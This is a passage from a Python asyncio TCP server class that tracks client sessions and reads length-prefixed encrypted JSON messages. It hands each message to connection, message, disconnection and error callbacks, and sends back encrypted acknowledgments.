            session_id = f"tcp_{client_addr[0]}_{client_addr[1]}_{int(time.time())}"

            self.client_connections[session_id] = writer
            self.connection_count += 1

            try:
                await self.on_connection(
                    {
                        "session_id": session_id,
                        "remote_addr": client_addr,
                        "protocol": "tcp",
                        "timestamp": time.time(),
                    }
                )
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("on_connection callback error: %s", e)

            # Handle messages from this client
            await self._handle_client_messages(reader, writer, session_id)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error handling TCP client connection: %s", e)
        finally:
            if session_id in self.client_connections:
                del self.client_connections[session_id]

    async def _handle_client_messages(self, reader, writer, session_id: str):
        """Handle messages from a specific client."""
        try:
            while True:
                # Read message length
                length_bytes = await reader.readexactly(4)
                message_length = int.from_bytes(length_bytes, byteorder="big")

                if message_length == 0:
                    break

                # Read message data
                encrypted_data = await reader.readexactly(message_length)

                # Decrypt and parse message
                decrypted = self.encryption_manager.decrypt(encrypted_data)
                message = json.loads(decrypted)

                try:
                    await self.on_message(session_id, message)
                except (
                    OSError,
                    ConnectionError,
                    TimeoutError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    json.JSONDecodeError,
                ) as e:
                    self.logger.error("on_message callback error: %s", e)

                # Send acknowledgment
                ack = {"status": "success", "timestamp": time.time()}
                encrypted_ack = self.encryption_manager.encrypt(json.dumps(ack))

                ack_length = len(encrypted_ack)
                frame = ack_length.to_bytes(4, byteorder="big") + encrypted_ack

                writer.write(frame)
                await writer.drain()

        except asyncio.IncompleteReadError:
            # Client disconnected
            try:
                await self.on_disconnection(session_id)
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error("on_disconnection callback error: %s", e)
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error("Error handling client messages: %s", e)
            try:
                await self.on_error("tcp", e)
            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as ex:
                self.logger.error("on_error callback error: %s", ex)
